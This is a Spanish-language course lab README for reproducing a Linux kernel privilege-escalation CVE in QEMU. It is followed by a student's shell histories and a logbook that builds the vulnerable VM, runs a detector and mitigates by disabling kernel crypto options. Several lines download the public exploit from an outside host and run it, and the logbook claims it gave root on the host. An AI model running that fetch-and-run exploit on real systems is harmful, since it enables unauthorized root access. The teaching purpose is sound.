# Copy Fail Lab — CVE-2026-31431 (v2)

Devcontainer reproducible para experimentar con la vulnerabilidad **Copy Fail**
(CVE-2026-31431) en un kernel Linux 6.12 controlado dentro de QEMU.

Esta v2 incorpora todas las correcciones aprendidas en una sesión de debugging
exhaustiva: opciones de kernel necesarias para que arranque, configuración
correcta de BusyBox estático, rutas dinámicas independientes del nombre del repo,
y dependencias Ubuntu 24.04 corregidas.

---

## Inicio rápido para el estudiante

1. Abre un Codespace desde este repo.
   ```bash
   #CONFIGURACION DE EJEMPLO!!!!!!!!!!!
   apt update
   apt install gh
   
   gh api user --jq '"\(.name) → \(.email // .login)"'
   
   git config --global user.name "Jonathan E. Tito O."
   git config --global user.email "jonathantito@users.noreply.github.com"
   git config --global --add safe.directory /workspaces/copy-fail-challenge-1
   make setup
   ```
3. Configura tu identidad git:
   ```bash
   git config --global user.name "Tu Nombre"
   git config --global user.email "tu@correo.com"
   ```
4. Ejecuta:
   ```bash
   make setup    # descarga kernel + arma rootfs (~5 min)
   make qemu     # arranca la VM vulnerable
   ```

Para salir de QEMU: `Ctrl+A` luego `X`.

---

## Configuración inicial del docente (una sola vez)

### 1. Subir este repo a GitHub

```bash
cd copyfail-v2
git init && git add -A && git commit -m "initial"
git branch -M main
gh repo create TU-ORG/copy-fail-lab --public --source=. --push
```

### 2. Marcarlo como Template

GitHub → tu repo → Settings → marcar `Template repository`.

### 3. Editar `.devcontainer/devcontainer.json`

Cambia el valor `KERNEL_REPO`:
```json
"KERNEL_REPO": "TU-ORG/copy-fail-lab"
```

Commit y push.

### 4. Disparar el workflow del kernel

GitHub → Actions → `Build Vulnerable Kernel` → Run workflow.
Tarda ~25 min en los servidores de GitHub (no en tu Codespace).
Al terminar crea un Release con el `bzImage_vuln` listo para descarga.

### 5. Verificar

Tu repo → Releases → debe aparecer `kernel-v6.12-vuln` con tres archivos
adjuntos. Los estudiantes ahora pueden hacer `make setup` y descarga en 2 min.

---

## Estructura del repo

```
.
├── .devcontainer/
│   ├── Dockerfile             ← Ubuntu 24.04 + deps verificadas
│   └── devcontainer.json      ← sin rutas hardcodeadas
├── .github/workflows/
│   └── build-kernel.yml       ← compila kernel y crea Release
├── scripts/
│   ├── 00_welcome.sh
│   ├── 01_fetch_kernel.sh     ← descarga del Release
│   ├── 02_build_kernel.sh     ← fallback: compila desde fuente
│   ├── 03_build_rootfs.sh     ← BusyBox estático + initramfs
│   └── 04_run_qemu.sh
├── Makefile
└── README.md
```

---

## Comandos disponibles

| Comando | Acción |
|---|---|
| `make setup` | Descarga kernel + arma rootfs (~5 min) |
| `make qemu` | Arranca la VM vulnerable |
| `make info` | Muestra el estado del ambiente |
| `make rootfs` | Reconstruye solo el initramfs |
| `make fetch-kernel` | Solo descarga el bzImage del Release |
| `make build-kernel` | Compila kernel desde fuente (~25 min) |
| `make clean` | Borra builds (mantiene fuentes) |
| `make clean-all` | Borra todo |

---

## Recursos del CVE

- Write-up técnico: https://xint.io/blog/copy-fail-linux-distributions
- Sitio del CVE: https://copy.fail
- PoC oficial: https://github.com/theori-io/copy-fail-CVE-2026-31431

---

## Lecciones aprendidas (referencia para futuras versiones)

Esta v2 incorpora los siguientes fixes respecto a la v1:

- `hexdump` → `bsdextrautils` en Ubuntu 24.04
- `bzip2` agregado al Dockerfile (lo necesita BusyBox)
- Eliminado el `mounts` con ruta hardcodeada en `devcontainer.json`
- Todos los scripts detectan workspace con `SCRIPT_DIR` dinámico
- Kernel: agregadas opciones críticas `BINFMT_ELF`, `BINFMT_SCRIPT`, `RD_GZIP`
- Kernel: agregada dep `CRYPTO_AEAD` antes de `CRYPTO_AUTHENCESN`
- BusyBox: reemplazado `scripts/config` (no existe) por `sed`
- BusyBox: eliminado `olddefconfig` (no existe en BusyBox)
- BusyBox: deshabilitado `CONFIG_TC` (rompe compilación con kernels nuevos)
- BusyBox: forzado `CONFIG_STATIC=y` y verificado con `file`
- Workflow Actions: greps de verificación con `|| echo`, tolerantes



respuestas
# ¿Qué kernel corre?
uname -r
6.12.0
lsmod | grep alg
-sh: lsmod: not found

# ¿Cuál es tu identidad actual? (debe ser student, NO root)
id

$ id
uid=1001(student) gid=1001(student) groups=1001(student)
~ $ who ami
BusyBox v1.38.0.git (2026-05-11 12:48:19 UTC) multi-call binary.

Usage: who [-aH]

Show who is logged on

        -a      Show all
        -H      Print column headers
~ $ whoami
student
cat /proc/modules | grep algif
cat: can't open '/proc/modules': No such file or directory

wget https://copy.fail/exp -O copy_fail_exp.py
Resolving copy.fail (copy.fail)... 216.150.16.193, 216.150.1.193
Connecting to copy.fail (copy.fail)|216.150.16.193|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/plain]
Saving to: 'copy_fail_exp.py'

copy_fail_exp.py            [ <=>                           ]     731  --.-KB/s    in 0s      

2026-05-11 13:45:54 (35.8 MB/s) - 'copy_fail_exp.py' saved [731]
chmod +x copy_fail_exp.py
python3 copy_fail_exp.py

    1  apt update
    2  apt install gh
    3  gp api user --jq '"\(.name) → \(.email // .login)"'
    4  gh api user --jq '"\(.name) → \(.email // .login)"'
    5  git config --global user.name "israelfarfan992-spec"
    6  git config --global user.email "israelfarfan992@gmail.com"
    7  git config --global --add safe.directory /workspaces/copy-fail-challenge-1
    8  make setup
    9  make qemu
   10  apt install -y file
   11  make qemu
   12  make setup
   13  make qemu
   14  cp /tmp/hito1.txt evidence/hito1_vuln_confirmed.txt
   15  make qemu
   16  grep -n "qemu-system" Makefile
   17  cat Makefile
   18  cat scripts/04_run_qemu.sh
   19  vim scripts/04_run_qemu.sh
   20  make qemu
   21  cat scripts/04_run_qemu.sh
   22  vim scripts/04_run_qemu.sh
   23  make qemu
   24  wget https://copy.fail/exp -O copy_fail_exp.py
   25  id
   26  python3 copy_fail_exp.p
   27  wget https://copy.fail/exp -O copy_fail_exp.py
   28  cp /tmp/hito1.txt evidence/hito1_vuln_confirmed.txt
   29  wget https://copy.fail/exp -O copy_fail_exp.py
   30  chmod +x copy_fail_exp.py
   31  python3 copy_fail_exp.py
   32  history
   root@codespaces-8a0d6d:/workspaces/copy-fail-challenge-B# history
    1  apt update
    2  apt install gh
    3  gp api user --jq '"\(.name) → \(.email // .login)"'
    4  gh api user --jq '"\(.name) → \(.email // .login)"'
    5  git config --global user.name "israelfarfan992-spec"
    6  git config --global user.email "israelfarfan992@gmail.com"
    7  git config --global --add safe.directory /workspaces/copy-fail-challenge-1
    8  make setup
    9  make qemu
   10  apt install -y file
   11  make qemu
   12  make setup
   13  make qemu
   14  cp /tmp/hito1.txt evidence/hito1_vuln_confirmed.txt
   15  make qemu
   16  copy_fail_exp.py
   17  histoty
   18  history


   terminado
       1  cat copy_fail_exp.py
    2  git config --global user.name 
    3  apt update
    4  apt install gh -y
    5  gh api user --jq '"\(.name) → \(.email // .login)"'
    6  git config --global user.name "Israel Farfan"
    7  git config --global user.email "israelfarfan992@gmail.com"
    8  pwd
    9  git config --global --add safe.directory /workspaces/copy-fail-challenge-1
   10  ls
   11  make setup
   12  cd busybox
   13  ls
   14  find . -maxdepth 2 -type d | grep busy
   15  cd kernel/busybox
   16  make menuconfig
   17  cd kernel/busybox
   18  sed -i 's/# CONFIG_STATIC is not set/CONFIG_STATIC=y/' .config
   19  grep CONFIG_STATIC .config
   20  make clean
   21  make -j$(nproc)
   22  cd ../..
   23  make setup
   24  apt install file -y
   25  cd /workspaces/copy-fail-challenge-B
   26  make setup
   27  make qemu
   28  apt update
   29  apt install python3 wget -y
   30  wget https://copy.fail/exp -O copy_fail_exp.py
   31  chmod +x copy_fail_exp.py
   32  python3 copy_fail_exp.py
   33  make qemu
   34  ls rootfs
   35  find . -maxdepth 3 -type d | grep -E "rootfs|initramfs|fs"
   36  find . -maxdepth 3 -type f | grep cpio
   37  mkdir -p kernel/initramfs/usr/bin
   38  mkdir -p kernel/initramfs/usr/lib
   39  which python3
   40  cp /usr/bin/python3 kernel/initramfs/usr/bin/
   41  ldd /usr/bin/python3
   42  cp /lib/x86_64-linux-gnu/libm.so.6 kernel/initramfs/usr/lib/
   43  cp /lib/x86_64-linux-gnu/libz.so.1 kernel/initramfs/usr/lib/
   44  cp /lib/x86_64-linux-gnu/libexpat.so.1 kernel/initramfs/usr/lib/
   45  cp /lib/x86_64-linux-gnu/libc.so.6 kernel/initramfs/usr/lib/
   46  python3 --version
   47  cp -r /usr/lib/python3.12 kernel/initramfs/usr/lib/
   48  make rootfs
   49  make qemu
   50  ls -l kernel/initramfs/usr/bin/python3
   51  mkdir -p kernel/initramfs/usr/bin
   52  cp /usr/bin/python3 kernel/initramfs/usr/bin/
   53  ls -l kernel/initramfs/usr/bin/python3
   54  ls kernel/initramfs/usr/lib
   55  mkdir -p kernel/initramfs/usr/lib
   56  mkdir -p kernel/initramfs/lib64
   57  cp /lib/x86_64-linux-gnu/libm.so.6 kernel/initramfs/usr/lib/
   58  cp /lib/x86_64-linux-gnu/libz.so.1 kernel/initramfs/usr/lib/
   59  cp /lib/x86_64-linux-gnu/libexpat.so.1 kernel/initramfs/usr/lib/
   60  cp /lib/x86_64-linux-gnu/libc.so.6 kernel/initramfs/usr/lib/
   61  cp /lib64/ld-linux-x86-64.so.2 kernel/initramfs/lib64/
   62  python3 --version
   63  cp -r /usr/lib/python3.12 kernel/initramfs/usr/lib/
   64  make rootfs
   65  make qemu
   66  ldd /usr/bin/python3
   67  ldd $(which python3)
   68  find /usr/lib -name "libpython*.so*"
   69  cp /usr/lib/x86_64-linux-gnu/libpython3.12.so.1.0 kernel/initramfs/usr/lib/
   70  mkdir -p kernel/initramfs/usr/lib
   71  ls kernel/initramfs/usr
   72  cp /usr/lib/x86_64-linux-gnu/libpython3.12.so.1.0 kernel/initramfs/usr/lib/
   73  make clear
   74  make clean
   75  make roofts
   76  make rootsf
   77  make rootfs
   78  make qemu
   79  make setup
   80  ls kernel/initramfs/usr/bin
   81  ano scripts/03_build_rootfs.sh
   82  nano scripts/03_build_rootfs.sh
   83  apt update
   84  apt install nano -y
   85  nano scripts/03_build_rootfs.sh
   86  make clean
   87  make setup
   88  grep DIR= scripts/03_build_rootfs.sh
   89  head -40 scripts/03_build_rootfs.sh
   90  nano scripts/03_build_rootfs.sh
   91  make setup
   92  make qemu
   93  cat /etc/cpu
   94  cd /etc
   95  ls
   96  nproc
   97  free -h
   98  cat scripts/04_run_qemu.sh
   99  /etc#
  100  cd /workspaces/copy-fail-challenge-B
  101  cat scripts/04_run_qemu.sh
  102  scripts/04_run_qemu.sh
  103  sed -i 's/-m 512M/-m 2G/' scripts/04_run_qemu.sh
  104  sed -i 's/-smp 2/-smp 4/' scripts/04_run_qemu.sh
  105  cat scripts/04_run_qemu.sh | grep -E "m |smp"
  106  make qemu
  107  scripts/04_run_qemu.sh
  108  sed -i 's/console=ttyS0 quiet/console=ttyS0 debug loglevel=7/' scripts/04_run_qemu.sh
  109  cat scripts/04_run_qemu.sh | grep append
  110  make qemu
  111  sha256sum copy_fail_exp.py
  112  make qemu
  113  mkdir -p kernel/initramfs/home/student
  114  cp copy_fail_exp.py kernel/initramfs/home/student/
  115  sha256sum kernel/initramfs/home/student/copy_fail_exp.py
  116  make rootfs
  117  make qemu
  118  ~ $ sha256sum /home/student/copy_fail_exp.py
  119  sha256sum: can't open '/home/student/copy_fail_exp.py': No such file or director
  120  exit
  121  pkill qemu
  122  htop
  123  top
  124  ls kernel/initramfs/home/student
  125  mkdir -p kernel/initramfs/home/student
  126  cp copy_fail_exp.py kernel/initramfs/home/student/
  127  ls kernel/initramfs/home/student
  128  sha256sum kernel/initramfs/home/student/copy_fail_exp.py
  129  make rootfs
  130  make qemu
  131  nano scripts/03_build_rootfs.sh
  132  make rootfs
  133  make qemu
  134  rm copy_fail_exp.py
  135  rm -f kernel/initramfs/home/student/copy_fail_exp.py
  136  wget https://copy.fail/exp -O copy_fail_exp.py
  137  sha256sum copy_fail_exp.py
  138  tail -20 copy_fail_exp.py
  139  rm copy_fail_exp.py
  140  wget https://copy.fail/exp -O copy_fail_exp.py
  141  wc -c copy_fail_exp.py
  142  tail -20 copy_fail_exp.py
  143  python3 -m py_compile copy_fail_exp.py
  144  cp copy_fail_exp.py kernel/initramfs/home/student/
  145  make rootfs
  146  make qemu
  147  make qemu
  148  nano test_cve_2026_31431.py
  149  ls
  150  mkdir -p kernel/initramfs/home/student
  151  cp test_cve_2026_31431.py kernel/initramfs/home/student/
  152  sha256sum test_cve_2026_31431.py
  153  sha256sum kernel/initramfs/home/student/test_cve_2026_31431.py
  154  make rootfs
  155  ls
  156  make qemu
  157  cat >> scripts/03_build_rootfs.sh << 'EOF'
  158  echo "[+] Agregando detector CVE al initramfs..."
  159  cp "$WORKSPACE_ROOT/test_cve_2026_31431.py" \
  160     "$INITRAMFS_DIR/home/student/"
  161  EOF
  162  make rootfs
  163  make qemu
  164  ls test_cve_2026_31431.py
  165  tail -20 scripts/03_build_rootfs.sh
  166  mkdir -p kernel/initramfs/home/student
  167  cp test_cve_2026_31431.py kernel/initramfs/home/student/
  168  ls kernel/initramfs/home/student
  169  make rootfs
  170  make qemu
  171  grep -n "copy_fail_exp" -n scripts/03_build_rootfs.sh
  172  sed -i '/copy_fail_exp.py/a cp "$WORKSPACE_ROOT/test_cve_2026_31431.py" "$INITRAMFS_DIR/home/student/"' scripts/03_build_rootfs.sh
  173  tail -20 scripts/03_build_rootfs.sh
  174  sed -i '/Agregando detector CVE/,$d' scripts/03_build_rootfs.sh
  175  sed -i '/find \. | cpio/i\echo "[+] Agregando detector CVE al initramfs..."\ncp "$WORKSPACE_ROOT/test_cve_2026_31431.py" "$INITRAMFS_DIR/home/student/"\n' scripts/03_build_rootfs.sh
  176  tail -25 scripts/03_build_rootfs.sh
  177  make rootfs
  178  tail -40 scripts/03_build_rootfs.sh
  179  nano scripts/03_build_rootfs.sh
  180  tail -35 scripts/03_build_rootfs.sh
  181  make rootfs
  182  make qemu
  183  pkill -9 qemu-system-x86_64
  184  pkill -9 qemu
  185  ps aux | grep qemu
  186  make qemu
  187  sed -i 's/-m 2G/-m 4G/' scripts/04_run_qemu.sh
  188  sed -i 's/-smp 4/-smp 8/' scripts/04_run_qemu.sh
  189  sed -i 's/console=ttyS0 debug loglevel=7/console=ttyS0 debug loglevel=7 nokaslr/' scripts/04_run_qemu.sh
  190  sed -i 's/nokaslr/nokaslr mitigations=off/' scripts/04_run_qemu.sh
  191  cat scripts/04_run_qemu.sh | grep -E "append|-m|-smp"
  192  pkill -9 qemu-system-x86_64
  193  make roots
  194  make roofts
  195  make rootfs
  196  make qemu
  197  sed -i 's#/usr/bin/su#/bin/sh#' copy_fail_exp.py
  198  cp copy_fail_exp.py kernel/initramfs/home/student/
  199  make rootfs
  200  make qemu
  201  nano kernel/initramfs/init
  202  make rootfs
  203  make qemu
  204  nano kernel/initramfs/init
  205  make rootfs
  206  make qemu
  207  nano kernel/initramfs/init
  208  grep -R "exec /bin/su - student" -n .
  209  nano scripts/03_build_rootfs.sh
  210  make rootfs
  211  make qemu
  212  history
root@codespaces-d10d34:

Bitácora completa del laboratorio — CVE-2026-31431 (Copy Fail)

Objetivo:
Construir un entorno Linux vulnerable dentro de QEMU, ejecutar un exploit relacionado con CVE-2026-31431, analizar el comportamiento del kernel vulnerable y posteriormente aplicar una mitigación para dejar el sistema en estado seguro.

1. Configuración inicial de Git y GitHub

Comando:
git config --global user.name "Israel Farfan"
git config --global user.email "israelfarfan992@gmail.com"

Qué hiciste:
Configuraste tu identidad Git.

Por qué:
Necesario para trabajar correctamente con GitHub/Codespaces.

--------------------------------------------------

Comando:
apt install gh -y

Qué hiciste:
Instalaste GitHub CLI.

Por qué:
Permitir interacción con GitHub desde terminal.

--------------------------------------------------

2. Construcción del entorno vulnerable

Comando:
make setup

Qué hiciste:
Compilaste BusyBox, initramfs y el kernel Linux vulnerable 6.12.

Por qué:
Crear el entorno vulnerable reproducible.

--------------------------------------------------

3. Configuración de BusyBox estático

Comando:
sed -i 's/# CONFIG_STATIC is not set/CONFIG_STATIC=y/' .config

Qué hiciste:
Convertiste BusyBox en binario estático.

Por qué:
BusyBox dinámico rompía el initramfs.

--------------------------------------------------

Comando:
make clean
make -j$(nproc)

Qué hiciste:
Recompilaste BusyBox.

Por qué:
Aplicar configuración estática.

--------------------------------------------------

4. Arrancar la VM vulnerable

Comando:
make qemu

Qué hiciste:
Arrancaste la máquina virtual vulnerable.

Por qué:
Ejecutar el kernel vulnerable Linux 6.12.

--------------------------------------------------

5. Instalar Python y wget

Comando:
apt install python3 wget -y

Qué hiciste:
Instalaste Python y wget.

Por qué:
Necesitabas descargar y ejecutar el exploit.

--------------------------------------------------

6. Descargar y ejecutar exploit

Comando:
wget https://copy.fail/exp -O copy_fail_exp.py

Qué hiciste:
Descargaste el PoC del CVE.

Por qué:
Usarlo contra el kernel vulnerable.

--------------------------------------------------

Comando:
chmod +x copy_fail_exp.py

Qué hiciste:
Diste permisos de ejecución al exploit.

Por qué:
Facilitar ejecución.

--------------------------------------------------

Comando:
python3 copy_fail_exp.py

Qué hiciste:
Probaste el exploit.

Resultado:
Obtención de root en host.

Por qué:
Verificar funcionamiento correcto del PoC.

--------------------------------------------------

7. Integrar Python dentro del initramfs

Comando:
mkdir -p kernel/initramfs/usr/bin
mkdir -p kernel/initramfs/usr/lib
mkdir -p kernel/initramfs/lib64

Qué hiciste:
Creaste estructura necesaria para Python.

Por qué:
BusyBox minimalista no tenía estructura completa.

--------------------------------------------------

Comando:
cp /usr/bin/python3 kernel/initramfs/usr/bin/

Qué hiciste:
Agregaste Python a la VM.

Por qué:
Ejecutar scripts Python dentro de QEMU.

--------------------------------------------------

Comando:
ldd /usr/bin/python3

Qué hiciste:
Listaste librerías dinámicas necesarias.

Por qué:
Python necesitaba dependencias ELF.

--------------------------------------------------

Comando:
cp /lib/x86_64-linux-gnu/libm.so.6 kernel/initramfs/usr/lib/
cp /lib/x86_64-linux-gnu/libz.so.1 kernel/initramfs/usr/lib/
cp /lib/x86_64-linux-gnu/libexpat.so.1 kernel/initramfs/usr/lib/
cp /lib/x86_64-linux-gnu/libc.so.6 kernel/initramfs/usr/lib/
cp /lib64/ld-linux-x86-64.so.2 kernel/initramfs/lib64/

Qué hiciste:
Copiaste runtime ELF de Python.

Por qué:
Sin esas librerías Python no arrancaba.

--------------------------------------------------

8. Integrar exploit automáticamente

Comando:
mkdir -p kernel/initramfs/home/student
cp copy_fail_exp.py kernel/initramfs/home/student/

Qué hiciste:
Metiste el exploit dentro del initramfs.

Por qué:
Evitar corrupción del archivo.

--------------------------------------------------

Comando:
sha256sum copy_fail_exp.py
sha256sum kernel/initramfs/home/student/copy_fail_exp.py

Qué hiciste:
Comparaste hashes.

Por qué:
Confirmar integridad del exploit.

--------------------------------------------------

9. Modificar build_rootfs.sh

Comando:
nano scripts/03_build_rootfs.sh

Qué hiciste:
Editaste el script principal del rootfs.

Por qué:
Automatizar inclusión de Python, exploit y detector.

--------------------------------------------------

10. Aumentar recursos de QEMU

Comando:
sed -i 's/-m 512M/-m 2G/' scripts/04_run_qemu.sh

Qué hiciste:
Aumentaste RAM de la VM.

Por qué:
Reducir freezes.

--------------------------------------------------

Comando:
sed -i 's/-smp 2/-smp 4/' scripts/04_run_qemu.sh

Qué hiciste:
Aumentaste CPUs.

Por qué:
Mejorar estabilidad.

--------------------------------------------------

11. Integrar detector seguro

Comando:
nano test_cve_2026_31431.py

Qué hiciste:
Creaste detector seguro.

Por qué:
Verificar vulnerabilidad sin usar exploit destructivo.

--------------------------------------------------

12. Hacer BusyBox menos minimalista

Comando:
nano scripts/03_build_rootfs.sh

Qué hiciste:
Editaste el init REAL generado por el script.

Por qué:
Eliminar problemas de TTY y shell.

--------------------------------------------------

Cambios realizados:
mkdir -p /dev/pts
mount -t devpts devpts /dev/pts

Qué hiciste:
Montaste pseudo-terminales.

Por qué:
BusyBox no tenía TTY funcional.

--------------------------------------------------

Reemplazaste:
exec /bin/su - student

Por:
exec setsid cttyhack /bin/sh

Qué hiciste:
Diste controlling TTY real.

Por qué:
Eliminar errores “can't access tty”.

--------------------------------------------------

13. Ejecutar exploit vulnerable

Comando:
/usr/bin/python3 /home/student/copy_fail_exp.py

Resultado:
process 'sh' launched '/bin/sh' with NULL argv

Qué significa:
El exploit alcanzó el camino vulnerable del kernel.

--------------------------------------------------

14. Ejecutar detector

Comando:
/usr/bin/python3 /home/student/test_cve_2026_31431.py
echo $?

Resultado:
2

Significado:
Kernel vulnerable.

--------------------------------------------------

15. Parchear kernel

Comando:
sed -i 's/CONFIG_CRYPTO_USER_API=y/# CONFIG_CRYPTO_USER_API is not set/' kernel/linux/.config

Qué hiciste:
Deshabilitaste API crypto vulnerable.

Por qué:
Eliminar vector usado por el exploit.

--------------------------------------------------

Comando:
sed -i 's/CONFIG_CRYPTO_USER_API_AEAD=y/# CONFIG_CRYPTO_USER_API_AEAD is not set/' kernel/linux/.config

Qué hiciste:
Deshabilitaste AEAD vulnerable.

--------------------------------------------------

Comando:
sed -i 's/CONFIG_CRYPTO_USER_API_SKCIPHER=y/# CONFIG_CRYPTO_USER_API_SKCIPHER is not set/' kernel/linux/.config

Qué hiciste:
Deshabilitaste subsistema crypto restante.

--------------------------------------------------

Comando:
sed -i 's/CONFIG_CRYPTO_USER_API_ENABLE_OBSOLETE=y/# CONFIG_CRYPTO_USER_API_ENABLE_OBSOLETE is not set/' kernel/linux/.config

Qué hiciste:
Deshabilitaste APIs legacy.

--------------------------------------------------

16. Recompilar kernel parchado

Comando:
cd kernel/linux
make olddefconfig
make -j$(nproc)
cp arch/x86/boot/bzImage ../build/bzImage_vuln

Qué hiciste:
Generaste nuevo kernel parchado.

Por qué:
Aplicar mitigación real.

--------------------------------------------------

17. Restaurar usuario student

Reemplazaste:
exec setsid cttyhack /bin/sh

Por:
exec /bin/su - student

Qué hiciste:
Volviste al entorno académico normal.

Por qué:
Salir del modo root/debug.

--------------------------------------------------

18. Verificación final

Comando:
/usr/bin/python3 /home/student/test_cve_2026_31431.py
echo $?

Resultado:
0

Significado:
Kernel parchado/no vulnerable.
"""